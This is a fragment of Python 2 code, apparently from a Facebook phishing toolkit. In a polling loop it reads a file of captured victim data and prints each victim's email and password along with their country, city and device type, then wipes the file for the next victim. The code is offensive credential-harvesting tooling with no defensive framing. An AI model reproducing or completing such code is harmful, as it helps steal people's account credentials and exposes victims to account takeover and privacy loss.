...
class home:
 def __init__(self):
		...
		return self._web()
 def _web(self):
     open("facebook/pc/up.txt","w")
     while True:
      if os.path.getsize("facebook/pc/up.txt") !=0:
		file=open("facebook/pc/up.txt").read()
		js=json.loads(file)
		...
		if len(self.r+self.t) !=0:
		 print prred+"\r"+"="*43
		 print pryellow+"\n [+] Email Id :"+prCyan+" {}".format(js["user"])
		 print
		 print pryellow+" [+] Password :"+prCyan+" {}".format(js["password"])
		 print
		 print pryellow+" [+] Country Name :"+prCyan+" {}".format(self.r[0])
		 print
		 print pryellow+" [+] City Name : "+prCyan+"{}".format(self.t[0])
		 print
		 print pryellow+" [+] Device Type : "+prCyan+"{}".format("Pc")
		 gg =open("facebook/pc/up.txt","w")
		 gg.write('')
		 gg.close()